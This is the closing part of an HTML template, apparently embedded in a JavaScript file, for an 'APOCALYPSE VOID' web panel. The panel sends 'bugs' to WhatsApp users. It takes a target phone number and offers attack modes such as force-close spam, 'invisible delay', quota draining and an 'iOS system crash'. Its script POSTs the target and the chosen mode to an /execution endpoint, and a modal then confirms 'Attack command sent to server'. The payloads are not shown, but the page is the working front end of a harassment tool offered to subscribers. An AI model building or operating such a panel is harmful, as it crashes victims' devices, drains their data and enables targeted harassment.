            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
            scroll-snap-align: start;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .type-option::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: transparent;
            transition: background 0.3s;
        }

        .type-option:hover {
            transform: translateY(-3px);
            border-color: rgba(59, 130, 246, 0.5);
            box-shadow: 0 5px 15px rgba(59, 130, 246, 0.2);
        }

        .type-option.selected {
            background: rgba(29, 78, 216, 0.2);
            border-color: var(--accent-blue);
            box-shadow: 0 5px 20px rgba(59, 130, 246, 0.3);
        }

        .type-option.selected::before {
            background: linear-gradient(90deg, var(--accent-blue), var(--accent-cyan));
        }

        .type-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 10px;
            font-size: 18px;
            color: var(--accent-blue);
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.2);
        }

        .type-option.selected .type-icon {
            color: white;
            background: linear-gradient(135deg, var(--accent-blue), var(--accent-cyan));
            border-color: transparent;
        }

        .type-name {
            font-size: 13px;
            color: #fff;
            font-weight: 500;
            margin-bottom: 5px;
            letter-spacing: 0.5px;
        }

        .type-desc {
            font-size: 10px;
            color: var(--text-gray);
            line-height: 1.3;
        }

        /* BUTTON - UPDATED WITH FULL GRADIENT */
        .send-btn {
            width: 100%;
            background: linear-gradient(135deg, #000000 0%, #1e293b 50%, var(--accent-blue-dark) 100%); /* Black to blue gradient */
            color: white; 
            border: none;
            padding: 18px; 
            font-weight: 600;
            border-radius: 15px;
            font-family: var(--font-main);
            font-size: 14px; 
            letter-spacing: 0px;
            cursor: pointer;
            display: flex; 
            align-items: center; 
            justify-content: center; 
            gap: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5), 0 0 20px rgba(59, 130, 246, 0.3);
            margin-top: 10px;
            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
            position: relative;
            overflow: hidden;
            z-index: 1;
        }

        .send-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            transition: left 0.7s;
            z-index: -1;
        }

        .send-btn:hover::before {
            left: 100%;
        }

        .send-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.6), 0 0 25px rgba(59, 130, 246, 0.5);
        }

        .send-btn:active { 
            transform: translateY(0); 
        }
        
        .send-btn:disabled {
            background: #1f2937;
            box-shadow: none;
            color: #6b7280;
            cursor: not-allowed;
            transform: none;
        }

        .send-btn:disabled::before {
            display: none;
        }

        /* --- BOTTOM NAV (UPDATED WITH BLUE THEME) --- */
        .bottom-nav {
            position: fixed; 
            bottom: 0; 
            left: 0; 
            width: 100%;
            background-color: rgba(0, 0, 0, 0.98);
            border-top: 1px solid rgba(59, 130, 246, 0.2);
            height: 75px; 
            display: flex; 
            justify-content: space-around; 
            align-items: center;
            z-index: 100;
        }

        .nav-item {
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            gap: 5px;
            cursor: pointer; 
            color: var(--text-gray);
            background: none; 
            border: none; 
            width: 80px;
            transition: all 0.2s;
        }

        .nav-item:active { transform: scale(0.95); }
        .nav-item.active { color: var(--accent-blue); }
        
        .nav-text {
            font-size: 10px; 
            font-family: var(--font-main);
            font-weight: 400;
        }

        /* --- SIDEBAR (UPDATED WITH BLUE THEME) --- */
        .sidebar-overlay {
            position: fixed; 
            inset: 0;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(4px);
            z-index: 998;
            opacity: 0; 
            visibility: hidden;
            transition: all 0.3s ease;
        }
        .sidebar-overlay.active { opacity: 1; visibility: visible; }

        .sidebar {
            position: fixed; 
            top: 0; 
            left: 0; 
            height: 100%;
            width: 280px;
            background: rgba(15, 23, 42, 0.98); /* Dark blue background */
            border-right: 1px solid rgba(59, 130, 246, 0.3);
            box-shadow: 10px 0 30px rgba(0,0,0,0.6);
            z-index: 999;
            transform: translateX(-100%);
            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex; 
            flex-direction: column;
        }
        .sidebar.active { transform: translateX(0); }

        .sidebar-header {
            height: 180px;
            width: 100%;
            background-image: url('https://files.catbox.moe/fgye5n.jpg'); 
            background-size: cover;
            background-position: center;
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            padding: 20px;
        }

        .sidebar-header::after {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(to top, rgba(15, 23, 42, 1) 15%, rgba(15, 23, 42, 0.4) 60%, transparent 100%);
            z-index: 1;
        }

        .sidebar-user {
            position: relative;
            z-index: 2;
            text-align: left;
        }

        .sidebar-user h3 { 
            font-size: 20px; 
            font-weight: 400; 
            letter-spacing: 0.5px; 
            color: #fff; 
            margin-bottom: 4px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
        }

        .user-tag { 
            font-size: 11px; 
            color: var(--accent-blue); /* Blue tag */
            letter-spacing: 0px; 
            font-weight: 400;
            background: rgba(0,0,0,0.6);
            padding: 3px 8px;
            border-radius: 4px;
            border: 1px solid rgba(59, 130, 246, 0.3);
            display: inline-block;
        }

        .sidebar-menu { 
            list-style: none; 
            padding: 15px; 
            flex: 1; 
            overflow-y: auto; 
        }
        .sidebar-item { margin-bottom: 6px; }
        .sidebar-link {
            display: flex; 
            align-items: center; 
            gap: 15px;
            padding: 12px 15px;
            color: #d1d5db;
            text-decoration: none;
            font-size: 14px; 
            font-weight: 400; 
            letter-spacing: 0px;
            border-radius: 10px;
            transition: all 0.2s;
        }
        .sidebar-link svg { width: 20px; height: 20px; opacity: 0.7; }
        
        .sidebar-link:active, .sidebar-link:hover {
            background: rgba(59, 130, 246, 0.1); /* Blue hover */
            color: var(--accent-blue);
        }
        .sidebar-link:active svg, .sidebar-link:hover svg { 
            opacity: 1; 
            color: var(--accent-blue); 
        }

        .menu-separator {
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.3), transparent); /* Blue separator */
            margin: 15px 0;
            width: 100%;
        }

        .sidebar-credits {
            padding: 0 10px;
            margin-bottom: 10px;
        }

        .credits-title {
            font-size: 11px;
            color: var(--accent-blue); /* Blue title */
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 12px;
            font-weight: 400;
            opacity: 0.9;
            padding-left: 10px;
        }

        .credit-item {
            font-size: 12px;
            color: #6b7280;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
            letter-spacing: 0px;
            padding-left: 10px;
        }

        .credit-item span {
            color: #e5e7eb;
            font-weight: 400;
        }

        .sidebar-footer { padding: 20px; border-top: 1px solid rgba(59, 130, 246, 0.1); }
        .logout-btn {
            width: 100%; 
            padding: 12px;
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #ef4444;
            border-radius: 12px;
            font-family: var(--font-main);
            font-size: 13px; 
            font-weight: 700; 
            letter-spacing: 1px;
            cursor: pointer; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            gap: 8px;
            transition: background 0.2s;
        }
        .logout-btn:active { background: rgba(239, 68, 68, 0.2); }

        /* --- UPDATED SUCCESS MODAL - ELEGANT AND POWERFUL --- */
        .modal-overlay {
            position: fixed;
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            z-index: 2000;
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 0;
            visibility: hidden;
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        
        .modal-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .success-card {
            background: linear-gradient(145deg, rgba(15, 23, 42, 0.95), rgba(0, 0, 0, 0.98));
            border: 1px solid rgba(59, 130, 246, 0.4);
            width: 90%;
            max-width: 380px;
            padding: 30px 25px;
            border-radius: 20px;
            text-align: center;
            position: relative;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(59, 130, 246, 0.2), 0 0 40px rgba(59, 130, 246, 0.2);
            transform: scale(0.8) translateY(30px);
            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
            overflow: hidden;
            z-index: 1;
        }

        .success-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-blue), var(--accent-cyan), var(--accent-blue));
            z-index: 2;
        }

        .success-card::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at 30% 20%, rgba(59, 130, 246, 0.1) 0%, transparent 70%);
            z-index: -1;
        }

        .modal-overlay.active .success-card {
            transform: scale(1) translateY(0);
        }

        .success-icon-container {
            width: 90px; 
            height: 90px;
            background: rgba(59, 130, 246, 0.1);
            border: 2px solid rgba(59, 130, 246, 0.3);
            border-radius: 50%;
            display: flex; 
            justify-content: center; 
            align-items: center;
            margin: 0 auto 25px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 0 30px rgba(59, 130, 246, 0.3);
            animation: pulse 2s infinite alternate;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 20px rgba(59, 130, 246, 0.3); }
            100% { box-shadow: 0 0 40px rgba(59, 130, 246, 0.6); }
        }

        .success-icon-container::before {
            content: '';
            position: absolute;
            top: -5px;
            left: -5px;
            right: -5px;
            bottom: -5px;
            background: conic-gradient(from 0deg, transparent, var(--accent-blue), transparent);
            border-radius: 50%;
            animation: rotate 3s linear infinite;
            z-index: -1;
        }

        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .success-icon-container i {
            color: var(--accent-blue);
            font-size: 40px;
            animation: checkPop 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
            z-index: 2;
        }

        @keyframes checkPop {
            0% { transform: scale(0); opacity: 0; }
            70% { transform: scale(1.2); }
            100% { transform: scale(1); opacity: 1; }
        }

        .success-title {
            color: white; 
            font-size: 24px; 
            margin-bottom: 8px;
            letter-spacing: 2px;
            font-weight: 700;
            text-transform: uppercase;
            background: linear-gradient(90deg, #fff, var(--accent-blue-light));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 2px 10px rgba(59, 130, 246, 0.3);
        }

        .success-subtitle {
            color: var(--text-gray); 
            font-size: 13px; 
            margin-bottom: 25px;
            letter-spacing: 1px;
        }

        .success-details {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 25px;
            text-align: left;
            border: 1px solid rgba(59, 130, 246, 0.2);
            position: relative;
            overflow: hidden;
        }

        .success-details::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: linear-gradient(to bottom, var(--accent-blue), var(--accent-cyan));
        }

        .detail-row {
            display: flex; 
            justify-content: space-between;
            font-size: 12px; 
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px dashed rgba(255, 255, 255, 0.05);
        }
        .detail-row:last-child { 
            margin-bottom: 0; 
            padding-bottom: 0;
            border-bottom: none;
        }
        .detail-label { 
            color: #9ca3af; 
            font-weight: 500;
        }
        .detail-value { 
            color: var(--accent-blue); 
            font-weight: bold; 
            text-align: right;
            max-width: 60%;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .detail-row.status .detail-value {
            color: var(--accent-green);
            position: relative;
            padding-left: 18px;
        }

        .detail-row.status .detail-value::before {
            content: '';
            position: absolute;
            left: 0;
            top: 50%;
            transform: translateY(-50%);
            width: 10px;
            height: 10px;
            background-color: var(--accent-green);
            border-radius: 50%;
            animation: pulseDot 1.5s infinite;
        }

        @keyframes pulseDot {
            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
            70% { box-shadow: 0 0 0 8px rgba(16, 185, 129, 0); }
            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }

        .close-modal-btn {
            background: linear-gradient(135deg, #000000 0%, #1e293b 50%, var(--accent-blue-dark) 100%);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-family: var(--font-main);
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
            letter-spacing: 1px;
            font-size: 14px;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
            z-index: 1;
        }

        .close-modal-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            transition: left 0.7s;
            z-index: -1;
        }

        .close-modal-btn:hover::before {
            left: 100%;
        }

        .close-modal-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6), 0 0 20px rgba(59, 130, 246, 0.3);
        }

        .close-modal-btn:active {
            transform: translateY(0);
        }

        /* Loading Spinner */
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(59, 130, 246, 0.3);
            border-radius: 50%;
            border-top-color: var(--accent-blue);
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Hide class */
        .hidden {
            display: none !important;
        }

        /* Responsive adjustments */
        @media (max-width: 380px) {
            .type-option {
                width: 120px;
                padding: 12px;
            }
            
            .success-card {
                padding: 25px 20px;
            }
            
            .success-title {
                font-size: 20px;
            }
            
            .profile-photo {
                width: 50px;
                height: 50px;
            }
            
            .username {
                font-size: 14px;
            }
            
            .expiry-box {
                min-width: 70px;
                padding: 5px 8px;
            }
        }

    </style>
</head>
<body>
    <div class="sidebar-overlay" id="sidebarOverlay"></div>
    <aside class="sidebar" id="sidebar">
        <div class="sidebar-header">
            <div class="sidebar-user">
                <h3 id="sidebar-username">Loading...</h3>
                <div class="user-tag" id="sidebar-role">ID: #Loading • ROLE</div>
            </div>
        </div>

        <ul class="sidebar-menu">
            <li class="sidebar-item">
                <a href="/dashboard" class="sidebar-link">
                    <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg>
                    Dashboard
                </a>
            </li>
            <li class="sidebar-item">
                <a href="/profile" class="sidebar-link">
                    <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
                    Profile
                </a>
            </li>
            <li class="sidebar-item">
                <a href="/execution" class="sidebar-link active">
                    <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
                    Execution
                </a>
            </li>
            
            <li class="sidebar-item hidden" id="admin-menu-item">
                <a href="/user-management" class="sidebar-link">
                    <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                    Admin menu
                </a>
            </li>
            
            <li class="sidebar-item">
                <a href="/my-support" class="sidebar-link">
                    <svg xmlns="http://www.w3.org/2000/svg" height="25px" viewBox="0 -960 960 960" width="25px" fill="currentColor"><path d="M61.85-425.31q-20.31-36.77-31.08-74.73T20-576q0-102.77 70.62-173.38Q161.23-820 264-820q61.85 0 118.27 29 56.42 29 97.73 82.16Q521.31-762 577.73-791T696-820q102.77 0 173.38 70.62Q940-678.77 940-576q0 37.23-10.77 74.81-10.77 37.57-31.08 75.5-8.69-13.62-20.42-24.39-11.73-10.76-26.35-17.46 14-28.38 21.31-55.19Q880-549.54 880-576q0-77.62-53.19-130.81T696-760q-71.38 0-118.35 40.85Q530.69-678.31 480-616q-50.69-62.92-97.65-103.46Q335.38-760 264-760q-77.62 0-130.81 53.19T80-576q0 27.23 7.31 54.23 7.31 27 20.92 54.62-14.61 7.07-26.15 17.65-11.54 10.58-20.23 24.19ZM20-99.23V-148q0-40.54 41.81-65.88 41.81-25.35 108.58-25.35 12.23 0 23.46.69t21.46 2.69q-11.31 17.7-17.16 37.62-5.84 19.92-5.84 42.46v56.54H20Zm240 0v-55q0-57.31 60.92-91.92 60.93-34.62 159.08-34.62 99.15 0 159.58 34.62Q700-211.54 700-154.23v55H260Zm507.69 0v-56.54q0-22.54-5.34-42.46-5.35-19.92-16.04-37.62 10.23-2 21.15-2.69 10.92-.69 22.54-.69 67.38 0 108.69 25.35Q940-188.54 940-148v48.77H767.69Zm-597.3-178.85q-28.39 0-48.43-20.03-20.04-20.04-20.04-48.43 0-28.61 20.04-48.34 20.04-19.73 48.43-19.73 28.61 0 48.53 19.73 19.93 19.73 19.93 48.34 0 28.39-19.93 48.43-19.92 20.03-48.53 20.03Zm619.61 0q-28 0-48.23-20.03-20.23-20.04-20.23-48.43 0-28.61 20.23-48.34Q762-414.61 790-414.61q29 0 48.73 19.73 19.73 19.73 19.73 48.34 0 28.39-19.73 48.43Q819-278.08 790-278.08Zm-310-32.69q-43.08 0-73.46-30.38-30.38-30.39-30.38-73.46 0-44.08 30.38-73.96 30.38-29.89 73.46-29.89 44.08 0 73.96 29.89 29.88 29.88 29.88 73.96 0 43.07-29.88 73.46-29.88 30.38-73.96 30.38Z"/></svg>Support
                </a>
            </li>

            <li class="menu-separator"></li>

            <div class="sidebar-credits">
                <div class="credits-title">Development Team</div>
                <div class="credit-item">
                    <span>@Restzy</span> - Dev Apocalypse
                </div>
                <div class="credit-item">
                    <span>@Restzy</span> - My Chanel
                </div>
            </div>
        </ul>

        <div class="sidebar-footer">
            <button class="logout-btn" id="logoutBtn">
                <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
                LOGOUT SYSTEM
            </button>
        </div>
    </aside>

    <div class="modal-overlay" id="successModal">
        <div class="success-card">
            <div class="success-icon-container">
                <i class="fa-solid fa-check"></i>
            </div>
            <h3 class="success-title">SYSTEM SUCCESS</h3>
            <p class="success-subtitle">Attack command sent to server</p>
            
            <div class="success-details">
                <div class="detail-row">
                    <span class="detail-label">Target:</span>
                    <span class="detail-value" id="modalTarget">-</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Method:</span>
                    <span class="detail-value" id="modalBug">-</span>
                </div>
                <div class="detail-row status">
                    <span class="detail-label">Status:</span>
                    <span class="detail-value">EXECUTING</span>
                </div>
            </div>

            <button class="close-modal-btn" id="closeModalBtn">CONFIRM</button>
        </div>
    </div>

    <div class="container">
        <header>
            <div class="header-left">
                <svg id="menuBtn" class="menu-btn" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <line x1="3" y1="6" x2="21" y2="6"></line>
                    <line x1="3" y1="12" x2="15" y2="12"></line> 
                    <line x1="3" y1="18" x2="18" y2="18"></line>
                </svg>
                <h1 class="brand-title">APOCALYPSE VOID</h1>
            </div>
        </header>

        <!-- MAIN CONTENT -->
        <main>
            <div class="user-card">
                <div class="user-card-content">
                    <div class="profile-photo">
                        <img src="https://files.catbox.moe/5m8xpw.jpg" alt="Profile">
                    </div>
                    <div class="user-info-middle">
                        <div class="username" id="exec-username">Loading...</div>
                        <div class="role-box">
                            <span class="role-label">Role</span>
                            <span class="role-value" id="exec-role">LOADING</span>
                        </div>
                    </div>
                    <div class="expiry-box">
                        <div class="expiry-label">Expires</div>
                        <div class="expiry-date" id="exec-expired">Loading...</div>
                    </div>
                </div>
            </div>

            <!-- BANNER -->
            <div class="banner">
                <img src="https://files.catbox.moe/7e4m5f.jpg">
                <div class="banner-text">
                    <h2>One Tap, One Dead</h2>
                </div>
            </div>

            <!-- FORM SECTION -->
            <div class="form-section">
                <div class="input-group">
                    <div class="input-header">
                        <h3>Number Targets</h3>
                    </div>
                    <div class="input-body">
                        <i class="fa-solid fa-mobile-screen"></i>
                        <input type="text" placeholder="e.g. 62xxxxxxxxxx" class="custom-input" id="targetInput">
                    </div>
                </div>

                <!-- HORIZONTAL SCROLLABLE TYPE SELECTOR -->
                <div class="type-selector-container">
                    <div class="type-selector-header">
                        <h3>Select Attack Type</h3>
                        <div class="scroll-hint">
                            <i class="fa-solid fa-arrows-left-right"></i>
                            Scroll to select
                        </div>
                    </div>
                    <div class="type-selector-scroll" id="typeSelector">
                        <div class="type-option" data-value="fortrash">
                            <div class="type-icon">
                                <i class="fa-brands fa-android"></i>
                            </div>
                            <div class="type-name">FORCLOSE TRASH</div>
                            <div class="type-desc">Spam Attack</div>
                        </div>
                        <div class="type-option" data-value="forbut">
                            <div class="type-icon">
                                <i class="fa-solid fa-skull"></i>
                            </div>
                            <div class="type-name">FORCLOSE FORCE</div>
                            <div class="type-desc">Force Bitter</div>
                        </div>
                        <div class="type-option" data-value="forceClose">
                            <div class="type-icon">
                                <i class="fa-solid fa-skull"></i>
                            </div>
                            <div class="type-name">FORCLOSE SPAM</div>
                            <div class="type-desc">Spam Attack Text</div>
                        </div>
                        <div class="type-option" data-value="invisDelay">
                            <div class="type-icon">
                                <i class="fa-solid fa-clock"></i>
                            </div>
                            <div class="type-name">SUPER DELAY</div>
                            <div class="type-desc">Maximum Delay Invis</div>
                        </div>
                        <div class="type-option" data-value="buldo">
                            <div class="type-icon">
                                <i class="fa-solid fa-skull"></i>
                            </div>
                            <div class="type-name">BULDOZER</div>
                            <div class="type-desc">Sedot Kuota</div>
                        </div>
                        <div class="type-option" data-value="killIos">
                            <div class="type-icon">
                                <i class="fa-brands fa-apple"></i>
                            </div>
                            <div class="type-name">Kill IOS</div>
                            <div class="type-desc">iOS system crash</div>
                        </div>
                    </div>
                    <input type="hidden" id="bugValue" value="">
                </div>

                <!-- Button -->
                <button class="send-btn" id="sendBtn" disabled>
                    <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#FFFFFF"><path d="M120-160v-240l320-80-320-80v-240l760 320-760 320Z"/></svg>
                    SEND BUG
                </button>
            </div>
        </main>

        <nav class="bottom-nav">
            <button class="nav-item" id="navDashboard">
                <svg width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"></path></svg>
                <span class="nav-text">Home</span>
            </button>
            <button class="nav-item active" id="navWhatsApp">
                <svg width="22" height="22" viewBox="0 -960 960 960" fill="currentColor" transform="matrix(-1,0,0,1,0,0)">
                    <path d="M240-400h480v-80H240v80Zm0-120h480v-80H240v80Zm0-120h480v-80H240v80ZM880-80 720-240H160q-33 0-56.5-23.5T80-320v-480q0-33 23.5-56.5T160-880h640q33 0 56.5 23.5T880-800v720ZM160-320h594l46 45v-525H160v480Zm0 0v-480 480Z"></path>
                </svg>
                <span class="nav-text">WhatsApp</span>
            </button>
            <button class="nav-item" id="navAnime">
                <svg width="22" height="22" viewBox="0 -960 960 960" fill="currentColor">
                    <path d="m160-800 80 160h120l-80-160h80l80 160h120l-80-160h80l80 160h120l-80-160h120q33 0 56.5 23.5T880-720v480q0 33-23.5 56.5T800-160H160q-33 0-56.5-23.5T80-240v-480q0-33 23.5-56.5T160-800Zm0 240v320h640v-320H160Zm0 0v320-320Z"/>
                    <path d="M380-320 l-25-60 -60-25 60-25 25-60 25 60 60 25 -60 25 -25 60Z"/>
                    <path d="M580-480 l-15-35 -35-15 35-15 15-35 15 35 35 15 -35 15 -15 35Z"/>
                </svg>
                <span class="nav-text">Anime</span>
            </button>
        </nav>
    </div>

<script>
document.addEventListener('DOMContentLoaded', async () => {

    const menuBtn = document.getElementById('menuBtn');
    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('sidebarOverlay');
    const sendBtn = document.getElementById('sendBtn');
    const targetInput = document.getElementById('targetInput');

    const successModal = document.getElementById('successModal');
    const closeModalBtn = document.getElementById('closeModalBtn');
    const modalTarget = document.getElementById('modalTarget');
    const modalBug = document.getElementById('modalBug');

    const typeOptions = document.querySelectorAll('.type-option');
    const bugValueInput = document.getElementById('bugValue');
    const typeSelector = document.getElementById('typeSelector');

    const logoutBtn = document.getElementById('logoutBtn');

    // ================= FETCH USER DATA =================
    async function fetchUserData() {
        try {
            const response = await fetch('/api/option-data');

            if (!response.ok) {
                console.warn('Option data endpoint error');
                return null;
            }

            let userData = {};
            try {
                userData = await response.json();
            } catch {
                console.warn('Invalid JSON option-data');
                return null;
            }

            console.log('User data:', userData);

            // Sidebar
            const sidebarUsername =
                document.getElementById('sidebar-username');
            const sidebarRole =
                document.getElementById('sidebar-role');

            if (sidebarUsername)
                sidebarUsername.textContent =
                    userData.username || 'Guest';

            if (sidebarRole)
                sidebarRole.textContent =
                    'Role: ' +
                    (
                        userData.role
                        ? userData.role.toUpperCase()
                        : 'USER'
                    );

            // Execution Card
            const execUsername =
                document.getElementById('exec-username');
            const execRole =
                document.getElementById('exec-role');
            const execExpired =
                document.getElementById('exec-expired');

            if (execUsername) {
                execUsername.textContent =
                    userData.username || 'Guest';

                if (execUsername.textContent.length > 15) {
                    execUsername.textContent =
                        execUsername.textContent.substring(0, 15) + '...';
                }
            }

            if (execRole) {
                execRole.textContent =
                    userData.role
                    ? userData.role.toUpperCase()
                    : 'USER';

                if (execRole.textContent.length > 10) {
                    execRole.textContent =
                        execRole.textContent.substring(0, 10) + '...';
                }
            }

            if (execExpired) {
                if (
                    userData.expired === 'Permanent' ||
                    userData.daysRemaining === 99999
                ) {
                    execExpired.textContent = 'Permanent';
                    execExpired.style.color = '#10b981';
                } else {
                    execExpired.textContent =
                        userData.expired || 'Unknown';
                    execExpired.style.color = '#eab308';
                }
            }

            const adminMenuItem =
                document.getElementById('admin-menu-item');

            if (adminMenuItem) {
                if (
                    userData.role === 'owner' ||
                    userData.role === 'admin'
                ) {
                    adminMenuItem.classList.remove('hidden');
                } else {
                    adminMenuItem.classList.add('hidden');
                }
            }

        } catch (err) {
            console.error('Fetch user error:', err);
        }
    }

    await fetchUserData();

    // ================= SIDEBAR =================
    function toggleSidebar() {
        sidebar.classList.toggle('active');
        overlay.classList.toggle('active');
    }

    menuBtn.addEventListener('click', toggleSidebar);
    overlay.addEventListener('click', toggleSidebar);

    // ================= NAVIGATION =================
    document.getElementById('navDashboard')
        .addEventListener('click', () => {
            window.location.href = '/dashboard';
        });

    document.getElementById('navWhatsApp')
        .addEventListener('click', () => {
            window.location.href = '/execution';
        });

    document.getElementById('navAnime')
        .addEventListener('click', () => {
            window.location.href = '/anime';
        });

    // ================= LOGOUT =================
    logoutBtn.addEventListener('click', () => {
        if (confirm('Are you sure you want to logout?')) {
            window.location.href = '/logout';
        }
    });

    // ================= TYPE SELECTOR =================
    let selectedType = null;

    typeOptions.forEach(option => {
        option.addEventListener('click', () => {

            typeOptions.forEach(opt =>
                opt.classList.remove('selected')
            );

            option.classList.add('selected');

            selectedType =
                option.getAttribute('data-value');

            bugValueInput.value = selectedType;

            validateForm();

            option.scrollIntoView({
                behavior: 'smooth',
                block: 'nearest',
                inline: 'center'
            });
        });
    });

    // ================= VALIDATION =================
    function validateForm() {
        const isTargetFilled =
            targetInput.value.trim() !== '';

        const isTypeSelected =
            bugValueInput.value !== '';

        sendBtn.disabled =
            !(isTargetFilled && isTypeSelected);
    }

    targetInput.addEventListener(
        'input',
        validateForm
    );

    // ================= SEND EXECUTION =================
    sendBtn.addEventListener('click', async () => {

        if (sendBtn.disabled) return;

        const originalContent =
            sendBtn.innerHTML;

        const targetValue =
            targetInput.value.trim();

        const selectedOption =
            document.querySelector(
                '.type-option.selected'
            );

        const typeName = selectedOption
            ? selectedOption.querySelector('.type-name').textContent
            : 'Unknown';

        sendBtn.innerHTML =
            '<i class="fa-solid fa-spinner fa-spin"></i> PROCESSING...';

        sendBtn.disabled = true;

        try {
            const response = await fetch(
                '/execution',
                {
                    method: 'POST',
                    headers: {
                        'Content-Type':
                            'application/x-www-form-urlencoded',
                    },
                    body: new URLSearchParams({
                        target: targetValue,
                        mode: bugValueInput.value
                    })
                }
            );

            let result = {};

            try {
                result = await response.json();
            } catch {
                result = {
                    success: false,
                    error: 'Invalid server response'
                };
            }

            if (result.success) {

                modalTarget.textContent =
                    targetValue || '-';

                modalBug.textContent =
                    typeName || '-';

                successModal.classList.add('active');

            } else {
                alert(
                    'Error: ' +
                    (result.error || 'Failed to execute bug')
                );
            }

        } catch (err) {
            console.error(err);
            alert('Failed to send bug request');

        } finally {
            sendBtn.innerHTML = originalContent;
            sendBtn.disabled = false;
        }
    });

    // ================= CLOSE MODAL =================
    closeModalBtn.addEventListener('click', () => {

        successModal.classList.remove('active');

        targetInput.value = '';

        typeOptions.forEach(opt =>
            opt.classList.remove('selected')
        );

        bugValueInput.value = '';
        selectedType = null;

        typeSelector.scrollLeft = 0;

        validateForm();
    });

    // Auto select first
    if (typeOptions.length > 0) {
        typeOptions[0].click();
    }

    // Auto refresh
    setInterval(fetchUserData, 30000);

});
</script>
</body>
</html>`;
};